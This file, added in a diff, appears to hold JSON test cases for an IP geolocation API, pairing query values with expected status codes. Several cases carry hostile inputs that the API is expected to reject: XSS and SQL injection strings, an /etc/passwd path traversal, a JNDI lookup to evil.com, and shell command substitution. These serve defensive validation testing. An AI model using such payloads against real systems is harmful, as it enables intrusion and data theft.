@@ -1,0 +1,505 @@
+[
+  {
+    "q": "185.249.71.82",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv4 address lookup - public IP returns complete geolocation data"
+  },
+  {
+    "q": "8.8.8.8",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv4 address lookup - Google DNS public IP"
+  },
+  {
+    "q": "1.1.1.1",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv4 address lookup - Cloudflare DNS public IP"
+  },
+  {
+    "q": "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv6 address lookup - full format IPv6 address"
+  },
+  {
+    "q": "2001:db8::1",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv6 address lookup - compressed format IPv6 address"
+  },
+  {
+    "q": "208.67.222.222",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv4 address lookup - OpenDNS public IP"
+  },
+  {
+    "q": "151.101.1.140",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv4 address lookup - CDN IP address"
+  },
+  {
+    "q": "13.107.42.14",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv4 address lookup - cloud provider IP address"
+  },
+  {
+    "expected_statusCode": 400,
+    "scenario": "Missing required query parameter 'q' - API should return error code 1003"
+  },
+  {
+    "q": "",
+    "expected_statusCode": 400,
+    "scenario": "Empty query parameter 'q' - invalid input returns error code 1003 or 1006"
+  },
+  {
+    "q": "999.999.999.999",
+    "expected_statusCode": 400,
+    "scenario": "Invalid IPv4 address format - octets exceed valid range, error code 1006"
+  },
+  {
+    "q": "256.1.1.1",
+    "expected_statusCode": 400,
+    "scenario": "Invalid IPv4 address - first octet exceeds 255, error code 1006"
+  },
+  {
+    "q": "192.168.1.1",
+    "expected_statusCode": 400,
+    "scenario": "Private IPv4 address - RFC1918 private range, error code 1006"
+  },
+  {
+    "q": "10.0.0.1",
+    "expected_statusCode": 400,
+    "scenario": "Private IPv4 address - Class A private range, error code 1006"
+  },
+  {
+    "q": "172.16.0.1",
+    "expected_statusCode": 400,
+    "scenario": "Private IPv4 address - Class B private range, error code 1006"
+  },
+  {
+    "q": "127.0.0.1",
+    "expected_statusCode": 400,
+    "scenario": "Localhost/loopback IP address - should be rejected, error code 1006"
+  },
+  {
+    "q": "0.0.0.0",
+    "expected_statusCode": 400,
+    "scenario": "Invalid zero IP address - non-routable address, error code 1006"
+  },
+  {
+    "q": "255.255.255.255",
+    "expected_statusCode": 400,
+    "scenario": "Broadcast IP address - should be rejected, error code 1006"
+  },
+  {
+    "q": "randomtext123",
+    "expected_statusCode": 400,
+    "scenario": "Non-IP string value - invalid format returns error code 1006"
+  },
+  {
+    "q": "not-an-ip-address",
+    "expected_statusCode": 400,
+    "scenario": "Alphabetic string instead of IP - format validation fails with error code 1006"
+  },
+  {
+    "q": "@#$%^&*",
+    "expected_statusCode": 400,
+    "scenario": "Special characters in query parameter - invalid format, error code 1005 or 1006"
+  },
+  {
+    "q": "<script>alert('xss')</script>",
+    "expected_statusCode": 400,
+    "scenario": "XSS injection attempt in query parameter - security validation, error code 1005 or 1006"
+  },
+  {
+    "q": "1' OR '1'='1",
+    "expected_statusCode": 400,
+    "scenario": "SQL injection attempt in query parameter - security validation, error code 1005 or 1006"
+  },
+  {
+    "q": "192.168.1",
+    "expected_statusCode": 400,
+    "scenario": "Incomplete IPv4 address - only 3 octets provided, error code 1006"
+  },
+  {
+    "q": "192.168",
+    "expected_statusCode": 400,
+    "scenario": "Incomplete IPv4 address - only 2 octets provided, error code 1006"
+  },
+  {
+    "q": "192.168.1.1.1",
+    "expected_statusCode": 400,
+    "scenario": "Invalid IPv4 address - more than 4 octets, error code 1006"
+  },
+  {
+    "q": "192.168.1.1.1.1",
+    "expected_statusCode": 400,
+    "scenario": "Invalid IPv4 address - 6 octets provided, error code 1006"
+  },
+  {
+    "q": "8.8.8.8:80",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with port number - invalid format, error code 1006"
+  },
+  {
+    "q": "8.8.8.8:443",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with HTTPS port - port not allowed, error code 1006"
+  },
+  {
+    "q": "8.8.8.8/24",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with CIDR notation - subnet notation not allowed, error code 1006"
+  },
+  {
+    "q": "192.168.1.0/16",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 CIDR block notation - network notation rejected, error code 1006"
+  },
+  {
+    "q": "8.8.8.8 ",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with trailing whitespace - format validation, error code 1006"
+  },
+  {
+    "q": " 8.8.8.8",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with leading whitespace - format validation, error code 1006"
+  },
+  {
+    "q": "8. 8. 8. 8",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with spaces between octets - invalid format, error code 1006"
+  },
+  {
+    "q": "null",
+    "expected_statusCode": 400,
+    "scenario": "String 'null' as query parameter value - invalid format, error code 1006"
+  },
+  {
+    "q": "undefined",
+    "expected_statusCode": 400,
+    "scenario": "String 'undefined' as query parameter value - invalid format, error code 1006"
+  },
+  {
+    "q": "测试",
+    "expected_statusCode": 400,
+    "scenario": "Unicode characters in query parameter - non-ASCII input, error code 1006"
+  },
+  {
+    "q": "тест",
+    "expected_statusCode": 400,
+    "scenario": "Cyrillic characters in query parameter - non-ASCII validation, error code 1006"
+  },
+  {
+    "q": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    "expected_statusCode": 400,
+    "scenario": "Very long string in query parameter - exceeds reasonable length, error code 1005 or 1006"
+  },
+  {
+    "q": "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ",
+    "expected_statusCode": 400,
+    "scenario": "Extremely long alphabetic string - length validation, error code 1005 or 1006"
+  },
+  {
+    "q": "134744072",
+    "expected_statusCode": 400,
+    "scenario": "Numeric IP representation without dots - decimal format not supported, error code 1006"
+  },
+  {
+    "q": "2130706433",
+    "expected_statusCode": 400,
+    "scenario": "Integer representation of IP address - numeric format invalid, error code 1006"
+  },
+  {
+    "q": "008.008.008.008",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with leading zeros - octal notation ambiguity, validation varies"
+  },
+  {
+    "q": "08.08.08.08",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with leading zeros on each octet - format validation"
+  },
+  {
+    "q": "192.168.-1.1",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with negative octet value - invalid format, error code 1006"
+  },
+  {
+    "q": "-1.-1.-1.-1",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with all negative octets - invalid range, error code 1006"
+  },
+  {
+    "q": "192.168.1.abc",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with alphabetic octet - mixed format invalid, error code 1006"
+  },
+  {
+    "q": "a.b.c.d",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 format with all alphabetic octets - completely invalid format, error code 1006"
+  },
+  {
+    "q": "192.168.1.1.2.3",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with 6 octets - too many segments, error code 1006"
+  },
+  {
+    "q": "....",
+    "expected_statusCode": 400,
+    "scenario": "Only dots without numbers - malformed IP format, error code 1006"
+  },
+  {
+    "q": "..1.1",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 address with empty octets - missing values, error code 1006"
+  },
+  {
+    "q": "169.254.0.0",
+    "expected_statusCode": 400,
+    "scenario": "Link-local address - APIPA range should be rejected, error code 1006"
+  },
+  {
+    "q": "224.0.0.1",
+    "expected_statusCode": 400,
+    "scenario": "Multicast IP address - Class D address invalid for lookup, error code 1006"
+  },
+  {
+    "q": "240.0.0.1",
+    "expected_statusCode": 400,
+    "scenario": "Reserved IP address - Class E address range, error code 1006"
+  },
+  {
+    "q": "::1",
+    "expected_statusCode": 200,
+    "scenario": "IPv6 loopback address - compressed notation, may return location data or error"
+  },
+  {
+    "q": "fe80::1",
+    "expected_statusCode": 400,
+    "scenario": "IPv6 link-local address - should be rejected as non-routable, error code 1006"
+  },
+  {
+    "q": "2001:4860:4860::8888",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv6 address lookup - Google Public DNS IPv6"
+  },
+  {
+    "q": "2606:4700:4700::1111",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv6 address lookup - Cloudflare DNS IPv6"
+  },
+  {
+    "q": "GGGG:HHHH:IIII:JJJJ:KKKK:LLLL:MMMM:NNNN",
+    "expected_statusCode": 400,
+    "scenario": "Invalid IPv6 address - non-hexadecimal characters, error code 1006"
+  },
+  {
+    "q": "2001:db8::",
+    "expected_statusCode": 200,
+    "scenario": "Valid IPv6 address - documentation prefix with compression"
+  },
+  {
+    "q": "192.168.1.1/192.168.1.255",
+    "expected_statusCode": 400,
+    "scenario": "IP range notation - range format not supported, error code 1006"
+  },
+  {
+    "q": "true",
+    "expected_statusCode": 400,
+    "scenario": "Boolean string value - non-IP data type, error code 1006"
+  },
+  {
+    "q": "false",
+    "expected_statusCode": 400,
+    "scenario": "Boolean false as string - invalid format, error code 1006"
+  },
+  {
+    "q": "{}",
+    "expected_statusCode": 400,
+    "scenario": "Empty JSON object as string - invalid format, error code 1006"
+  },
+  {
+    "q": "[]",
+    "expected_statusCode": 400,
+    "scenario": "Empty JSON array as string - invalid format, error code 1006"
+  },
+  {
+    "q": "http://8.8.8.8",
+    "expected_statusCode": 400,
+    "scenario": "IP address with protocol prefix - URL format not allowed, error code 1005 or 1006"
+  },
+  {
+    "q": "https://8.8.8.8",
+    "expected_statusCode": 400,
+    "scenario": "IP address with HTTPS protocol - URL notation invalid, error code 1005 or 1006"
+  },
+  {
+    "q": "8.8.8.8/path",
+    "expected_statusCode": 400,
+    "scenario": "IP address with path notation - URL path not supported, error code 1006"
+  },
+  {
+    "q": "8.8.8.8?query=value",
+    "expected_statusCode": 400,
+    "scenario": "IP address with query string - URL query format invalid, error code 1005 or 1006"
+  },
+  {
+    "q": "8.8.8.8#fragment",
+    "expected_statusCode": 400,
+    "scenario": "IP address with URL fragment - hash notation invalid, error code 1006"
+  },
+  {
+    "q": "192.168.001.001",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with zero-padded octets to 3 digits - format ambiguity"
+  },
+  {
+    "q": "0x08.0x08.0x08.0x08",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 in hexadecimal notation - hex format not supported, error code 1006"
+  },
+  {
+    "q": "192.168.1.1e10",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with scientific notation - invalid octet format, error code 1006"
+  },
+  {
+    "q": "192.168.1.1.2",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with 5 octets - extra octet provided, error code 1006"
+  },
+  {
+    "q": "!@#$%^&*()",
+    "expected_statusCode": 400,
+    "scenario": "Only special characters - no valid IP format, error code 1005 or 1006"
+  },
+  {
+    "q": "\\x08\\x08\\x08\\x08",
+    "expected_statusCode": 400,
+    "scenario": "Escaped hexadecimal notation - invalid format, error code 1006"
+  },
+  {
+    "q": "SELECT * FROM users",
+    "expected_statusCode": 400,
+    "scenario": "SQL query string - SQL injection attempt, error code 1005 or 1006"
+  },
+  {
+    "q": "../../../etc/passwd",
+    "expected_statusCode": 400,
+    "scenario": "Path traversal attempt - security validation, error code 1005 or 1006"
+  },
+  {
+    "q": "${jndi:ldap://evil.com/a}",
+    "expected_statusCode": 400,
+    "scenario": "JNDI injection attempt - security validation, error code 1005 or 1006"
+  },
+  {
+    "q": "%00",
+    "expected_statusCode": 400,
+    "scenario": "Null byte injection - security validation, error code 1005 or 1006"
+  },
+  {
+    "q": "8.8.8.8\n",
+    "expected_statusCode": 400,
+    "scenario": "IP address with newline character - format validation, error code 1006"
+  },
+  {
+    "q": "8.8.8.8\r\n",
+    "expected_statusCode": 400,
+    "scenario": "IP address with CRLF characters - format validation, error code 1006"
+  },
+  {
+    "q": "8.8.8.8\t",
+    "expected_statusCode": 400,
+    "scenario": "IP address with tab character - whitespace validation, error code 1006"
+  },
+  {
+    "q": "8.8.8.8;",
+    "expected_statusCode": 400,
+    "scenario": "IP address with semicolon - command injection attempt, error code 1006"
+  },
+  {
+    "q": "8.8.8.8|",
+    "expected_statusCode": 400,
+    "scenario": "IP address with pipe character - command injection attempt, error code 1006"
+  },
+  {
+    "q": "8.8.8.8&",
+    "expected_statusCode": 400,
+    "scenario": "IP address with ampersand - command injection attempt, error code 1006"
+  },
+  {
+    "q": "8.8.8.8`whoami`",
+    "expected_statusCode": 400,
+    "scenario": "IP address with command substitution - injection attempt, error code 1006"
+  },
+  {
+    "q": "8.8.8.8$(whoami)",
+    "expected_statusCode": 400,
+    "scenario": "IP address with command substitution syntax - injection attempt, error code 1006"
+  },
+  {
+    "q": "192.168.1.256",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with octet value 256 - exceeds maximum octet value, error code 1006"
+  },
+  {
+    "q": "192.168.300.1",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with octet value 300 - exceeds valid range, error code 1006"
+  },
+  {
+    "q": "192.168.1.1000",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with octet value 1000 - far exceeds maximum, error code 1006"
+  },
+  {
+    "q": "1.1.1",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with only 3 octets - incomplete address, error code 1006"
+  },
+  {
+    "q": "1.1",
+    "expected_statusCode": 400,
+    "scenario": "IPv4 with only 2 octets - incomplete address, error code 1006"
+  },
+  {
+    "q": "1",
+    "expected_statusCode": 400,
+    "scenario": "Single number as IP - incomplete address, error code 1006"
+  },
+  {
+    "expected_statusCode": 401,
+    "scenario": "Missing API key authentication - no credentials provided, error code 1002"
+  },
+  {
+    "q": "8.8.8.8",
+    "expected_statusCode": 401,
+    "scenario": "Valid IP with missing API key - authentication required, error code 1002"
+  },
+  {
+    "q": "1.1.1.1",
+    "expected_statusCode": 401,
+    "scenario": "Valid query parameter but missing authentication - error code 1002"
+  },
+  {
+    "q": "8.8.8.8",
+    "expected_statusCode": 403,
+    "scenario": "API key exceeds monthly quota - usage limit reached, error code 2007"
+  },
+  {
+    "q": "8.8.8.8",
+    "expected_statusCode": 403,
+    "scenario": "API key has been disabled - account suspended, error code 2008"
+  },
+  {
+    "q": "1.1.1.1",
+    "expected_statusCode": 403,
+    "scenario": "API key lacks access to IP lookup resource - insufficient permissions, error code 2009"
+  },
+  {
+    "q": "185.249.71.82",
+    "expected_statusCode": 403,
+    "scenario": "Valid IP but subscription plan does not include this resource - error code 2009"
+  }
+]
